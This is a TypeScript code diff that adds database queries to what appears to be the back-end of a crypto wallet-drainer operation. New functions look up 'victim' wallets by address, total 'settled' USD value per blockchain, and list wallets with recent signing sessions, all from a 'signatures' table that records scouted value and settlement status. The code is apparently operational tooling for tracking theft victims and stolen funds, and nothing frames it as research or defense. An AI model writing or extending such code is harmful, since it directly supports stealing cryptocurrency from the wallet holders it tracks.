@@ -88,6 +88,103 @@ export async function queryRecentSettled(limit: number): Promise<RecentSettledRo
   }))
 }
 
+/** Rows for a specific wallet address — all statuses, most-recent first. */
+export type VictimRow = {
+  wallet_address: string
+  chain_id: string | null
+  protocol: string | null
+  settlement_status: string | null
+  scout_value_usd: string | null
+  wallet_type: string | null
+  created_at: string
+}
+
+export async function queryVictimInfo(wallet: string): Promise<VictimRow[]> {
+  const sb = vaultClient()
+  if (!sb) return []
+  const { data, error } = await sb
+    .from('signatures')
+    .select('wallet_address,chain_id,protocol,settlement_status,scout_value_usd,wallet_type,created_at')
+    .ilike('wallet_address', wallet)
+    .order('created_at', { ascending: false })
+    .limit(20)
+
+  if (error || !data) return []
+  return (data as Array<Record<string, unknown>>).map((row) => ({
+    wallet_address: String(row.wallet_address ?? ''),
+    chain_id: row.chain_id != null ? String(row.chain_id) : null,
+    protocol: row.protocol != null ? String(row.protocol) : null,
+    settlement_status: row.settlement_status != null ? String(row.settlement_status) : null,
+    scout_value_usd: row.scout_value_usd != null ? String(row.scout_value_usd) : null,
+    wallet_type: row.wallet_type != null ? String(row.wallet_type) : null,
+    created_at: normalizeCreatedAt(row.created_at),
+  }))
+}
+
+/** Chain-level breakdown: settlement count + total USD per chain_id. */
+export type ChainBreakdownRow = {
+  chain_id: string
+  count: number
+  total_usd: number
+}
+
+export async function queryChainBreakdown(): Promise<ChainBreakdownRow[]> {
+  const sb = vaultClient()
+  if (!sb) return []
+  const { data, error } = await sb
+    .from('signatures')
+    .select('chain_id,scout_value_usd')
+    .eq('settlement_status', 'SETTLED')
+
+  if (error || !data) return []
+
+  const byChain: Record<string, { count: number; total: number }> = {}
+  for (const row of data as Array<{ chain_id?: string | null; scout_value_usd?: string | null }>) {
+    const cid = String(row.chain_id ?? 'unknown')
+    if (!byChain[cid]) byChain[cid] = { count: 0, total: 0 }
+    byChain[cid].count += 1
+    const usd = Number(row.scout_value_usd ?? '0')
+    if (Number.isFinite(usd) && usd > 0) byChain[cid].total += usd
+  }
+
+  return Object.entries(byChain)
+    .map(([chain_id, { count, total }]) => ({ chain_id, count, total_usd: total }))
+    .sort((a, b) => b.total_usd - a.total_usd)
+}
+
+/** Wallets with a signature record in last `minutes` minutes — any status. */
+export type ActiveSessionRow = {
+  wallet_address: string
+  chain_id: string | null
+  wallet_type: string | null
+  settlement_status: string | null
+  scout_value_usd: string | null
+  created_at: string
+}
+
+export async function queryActiveRecentSessions(minutes = 30): Promise<ActiveSessionRow[]> {
+  const sb = vaultClient()
+  if (!sb) return []
+
+  const since = new Date(Date.now() - minutes * 60 * 1000).toISOString()
+  const { data, error } = await sb
+    .from('signatures')
+    .select('wallet_address,chain_id,wallet_type,settlement_status,scout_value_usd,created_at')
+    .gte('created_at', since)
+    .order('created_at', { ascending: false })
+    .limit(25)
+
+  if (error || !data) return []
+  return (data as Array<Record<string, unknown>>).map((row) => ({
+    wallet_address: String(row.wallet_address ?? ''),
+    chain_id: row.chain_id != null ? String(row.chain_id) : null,
+    wallet_type: row.wallet_type != null ? String(row.wallet_type) : null,
+    settlement_status: row.settlement_status != null ? String(row.settlement_status) : null,
+    scout_value_usd: row.scout_value_usd != null ? String(row.scout_value_usd) : null,
+    created_at: normalizeCreatedAt(row.created_at),
+  }))
+}
+
 export async function queryTodaySettledStats(): Promise<{
   count: number
   total_usd: number
